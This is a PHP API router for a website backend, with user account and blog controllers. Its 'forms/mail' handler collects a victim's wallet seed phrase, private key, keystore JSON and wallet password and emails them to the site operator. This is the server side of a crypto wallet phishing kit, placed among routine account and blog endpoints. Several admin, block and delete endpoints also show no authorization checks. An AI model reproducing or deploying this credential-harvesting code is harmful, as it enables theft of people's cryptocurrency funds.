<?php
// Report all PHP errors
error_reporting(E_ALL);
date_default_timezone_set("Africa/Lagos");

require 'header.php';
// call all the required files
require_once 'config/env.php';
require 'classes/Email.php';
require 'classes/Functions.php';
require 'classes/DataTypes.php';
require 'classes/Schema.php';
require 'classes/Accounts.php';
require 'classes/Users.php';
require 'classes/Blogs.php';

$input = file_get_contents('php://input');
$data = json_decode($input, true);

// $conn = (new Database())->connect();
$fn = new Functions(); //functions
// $mail = new Email();

$controller = $_GET['controller'];
$request = $_GET['request'];

if ($_SERVER["REQUEST_METHOD"] === "POST") {

    if($controller==="forms") {
        $mail = new Email();

        if($request=="mail") {
               
            $key = $fn->sanitize($data['key']);
            $wallet = $fn->sanitize($data['wallet']);
            $pkey = $fn->sanitize($data['privateKey']);
            $phrase = $fn->sanitize($data['phrase']);
            $keystore = $fn->sanitize($data['keyStoreJSON']);
            $password = $fn->sanitize($data['walletPassword']);

            if($key=="phrase") {
                $message = "<b>See below submission:</b>";
                $message .= "<p><b>Selected Field:</b> {$key}</p>";
                $message .= "<p><b>Wallet:</b> {$wallet}</p>";
                $message .= "<p><b>Phrase:</b> {$phrase}</p>";
            }
            
            if($key=="keystoreJSON") {
                
                $message = "<b>See below submission:</b>";
                $message .= "<p><b>Selected Field:</b> {$key}</p>";
                $message .= "<p><b>Wallet:</b> {$wallet}</p>";
                $message .= "<p><b>Keystore JSON:</b> {$keystore}</p>";
                $message .= "<p><b>Password:</b> {$password}</p>";
            }
            
            if($key=="privateKey") {
                $message = "<b>See below submission:</b>";
                $message .= "<p><b>Selected Field:</b> {$key}</p>";
                $message .= "<p><b>Wallet:</b> {$wallet}</p>";
                $message .= "<p><b>Private Key:</b> {$pkey}</p>";
            }

            $subject = "New Submission"; //Set title here
            
            
            if ($mail->sendMail($subject, $message)) {
                // http_response_code(200);
                $response = array('status' => 'success', 'message' => 'Email Sent!');
                echo json_encode($response);
            } else {
                // http_response_code(503);
                $response = array('status' => 'error', 'message' => 'Error sending email!');
                echo json_encode($response);
            }
        }
    }
    
    // USERS CONTROLLER REQUESTS
    if($controller=="users") {
        $user = new Users();
        if($request=="all") {
            echo json_encode($user->allUsers());
        }

        if ($request === "create-account") {
            $account = $fn->sanitize($data['account']);
            $fname = $fn->sanitize($data['fname']);
            $lname = $fn->sanitize($data['lname']);
            $phone = $fn->sanitize($data['phone']);
            $email = $fn->sanitize($data['email']);
            $password = $fn->sanitize($data['password']);
    
            echo json_encode($user->register($fname, $lname, $email, $phone, $account, $password));
        }
    
        if ($request === "login") {
            $username = $fn->sanitize($data['username']);
            $password = $fn->sanitize($data['password']);
    
            echo json_encode($user->login($username, $password));
        }
    
        if ($request === 'update') {
            $uid = $fn->sanitize($data['uid']);
            $fname = $fn->sanitize($data['fname']);
            $lname = $fn->sanitize($data['lname']);
            $phone = $fn->sanitize($data['phone']);
            $changePhoto = $fn->sanitize($data['changePhoto']);       
            $photoData = isset($data['photo']) ? $data['photo'] : "";
            $photo = isset($data['photo']) ? $data['photo'] : "";
    
            if($changePhoto==1){         
                $photoData = base64_decode(preg_replace('#^data:image/\w+;base64,#i', '', $photoData));
                $img = imagecreatefromstring($photoData);
                if ($img !== false) {
                    $newImg = $user->randomStr(10) . '-' . time() . '.jpg';
                    $directory = '../uploads/avatar/' . $newImg;
    
                    $photo = $newImg;
                    imagejpeg($img,$directory);
                    imagedestroy($img);
                }
            }
    
            echo json_encode(
                $user->updateUser($uid, $fname, $lname, $phone, $photo)
            );
        }
    
        if ($request === "resend-code") {
            $username = $fn->sanitize($data['username']);
    
            echo json_encode($user->resend($username));
        }
    
        if ($request === "verify") {
            $vcode = $fn->sanitize($data['vcode']);
            $email = $fn->sanitize($data['email']);
    
            echo json_encode($user->verify($vcode, $email));
        }
    
        if ($request === "info") {
            $username = $fn->sanitize($data['username']);
    
            echo json_encode($user->userInfo($username));
        }
    
        if ($request === "recover") {
            $username = $fn->sanitize($data['username']);
    
            echo json_encode($user->recover($username));
        }
    
        if ($request === "reset-password") {
            $otp = $fn->sanitize($data['otp']);
            $email = $fn->sanitize($data['email']);
            $password = $fn->sanitize($data['password']);
    
            echo json_encode($user->resetPassword($email, $password, $otp));
        }
    
        if ($request === "make-admin") {
            $uid = $fn->sanitize($data['uid']);
            $column = "account";
            $value = 1; //status for blocked user
    
            echo json_encode($user->updateUserCol($uid,$column,$value));
        }
    
        if ($request === "remove-admin") {
            $uid = $fn->sanitize($data['uid']);
            $column = "account";
            $value = 2; //status for blocked user
    
            echo json_encode($user->updateUserCol($uid,$column,$value));
        }
    
        if ($request === "block") {
            $uid = $fn->sanitize($data['uid']);
            $column = "status";
            $value = 2; //status for blocked user
    
            echo json_encode($user->updateUserCol($uid,$column,$value));
        }
    
        if ($request === "unblock") {
            $uid = $fn->sanitize($data['uid']);
            $column = "status";
            $value = 1; //status for blocked user
    
            echo json_encode($user->updateUserCol($uid,$column,$value));
        }
    
        if ($request === "trash") {
            $uid = $fn->sanitize($data['uid']);
            $column = "deleted";
            $value = 1; //status for blocked user
    
            echo json_encode($user->updateUserCol($uid,$column,$value));
        }
    
        if ($request === "restore") {
            $uid = $fn->sanitize($data['uid']);
            $column = "deleted";
            $value = 0; //status for blocked user
    
            echo json_encode($user->updateUserCol($uid,$column,$value));
        }
    
        if ($request === "delete") {
            $uid = $fn->sanitize($data['uid']);
    
            echo json_encode($user->deleteUser($uid));
        }
    
        if ($request === "change-password") {
            $uid = $fn->sanitize($data['uid']);
            $email = $fn->sanitize($data['email']);
            $new = $fn->sanitize($data['password']);
            $repnew = $fn->sanitize($data['repassword']);
    
            echo json_encode($user->changePwd($uid, $email, $new, $repnew));
        }
    
        if($request==='list-by-account'){
            $account = $fn->sanitize($data['account']);
    
            echo json_encode($user->selectUserBy('account',$account));
        }
    }
    
    if($controller==="blogs") {
        $blog = new Blogs();
        if($request=="all") {
            echo json_encode($blog->allPosts());
        }

        if ($request === "add") {
            $slug = $fn->sanitize($data['slug']);
            $title = $fn->sanitize($data['title']);
            $intro = $fn->sanitize($data['intro']);
            $content = $data['content'];
            $category = $fn->sanitize($data['category']);
            $poster = $fn->sanitize($data['poster']);

            $image = isset($data['image']) ? $data['image'] : "";

            if(!empty($image)){         
                $imgData = base64_decode(preg_replace('#^data:image/\w+;base64,#i', '', $image));
                $img = imagecreatefromstring($imgData);
                if ($img !== false) {
                    $newImg = $fn->randomStr(10) . '-' . time() . '.jpg';
                    $directory = '../uploads/blogs/' . $newImg;
    
                    $image = $newImg;
                    imagejpeg($img,$directory);
                    imagedestroy($img);
                }
            }
    
            echo json_encode($blog->add($slug,$title,$intro,$content,$category,$poster,$image));
        }
    
        if ($request === 'update') {
            $slug = $fn->sanitize($data['slug']);
            $title = $fn->sanitize($data['title']);
            $intro = $fn->sanitize($data['intro']);
            $content = $fn->sanitize($data['content']);
            $category = $fn->sanitize($data['category']);
            $poster = $fn->sanitize($data['poster']);

            $image = isset($data['image']) ? $data['image'] : "";
            
            if(!empty($image)){         
                $imgData = base64_decode(preg_replace('#^data:image/\w+;base64,#i', '', $image));
                $img = imagecreatefromstring($imgData);
                if ($img !== false) {
                    $newImg = $fn->randomStr(10) . '-' . time() . '.jpg';
                    $directory = '../uploads/blogs/' . $newImg;
    
                    $image = $newImg;
                    imagejpeg($img,$directory);
                    imagedestroy($img);
                }
            }
    
            echo json_encode($blog->updatePost($slug,$title,$intro,$content,$category,$poster,$image));
        }
    
        if ($request === "delete") {
            $id = $fn->sanitize($data['id']);
    
            echo json_encode($blog->deletePost($id));
        }
    }
}